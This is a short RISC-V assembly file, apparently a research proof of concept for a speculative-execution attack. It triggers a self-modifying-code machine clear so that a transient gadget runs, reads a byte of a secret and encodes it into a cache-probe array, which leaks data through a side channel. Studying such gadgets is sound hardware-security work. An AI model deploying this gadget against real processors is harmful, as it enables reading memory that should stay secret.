#include "defines.h"

.section .text
.global smc_snippet
smc_snippet:
// ; stack management {
    addi    sp,sp,-16
    sd	    s0,8(sp)
// ; }
// ; Load addr of target instr 
    la t0, target
// ;Code to write as data: 1 nop (overwriting lines of target)
    li t1, 0x0001
    li t2, 0

// ; These instructions serve as a delay
// ; for the store argument address. They
// ; ensure that the execution window of
// ; spec_code is as long as possible.
continue:
    addi t0, t0, -2
    li t3, 2
    slli t4, t3, 0x4
    fcvt.s.lu fa4, t3 
    fcvt.s.lu fa5, t4 
    .rept 4
    fdiv.s fa5, fa5, fa4
    .endr
    fcvt.lu.s t4, fa5, rtz
    add t0, t0, t4
// ;Store at target addr. Also: the last retired instr
// ;from which the execution will resume after the SMC MC
    sh t1, 0(t0)

// ;Target instruction to be modified
target:
    j spec_code
    nop
    nop
    nop

// ;Architectural exit point of the function
    li a0, MAGIC_NUMBER
    j reset_stack
    
// ;Code executed speculatively (flushed after SMC MC).
spec_code:
    la t1, secret  
    add t1, t1, a1
    lb t2, 0(t1)
    sll t2, t2, 6
    add a0, a0, t2
    lb t2, 0(a0)
    addi a0, t2, 0
    
reset_stack:
    addi	s0,sp,16
    ld	    s0,8(sp)
    addi	sp,sp,16
    ret

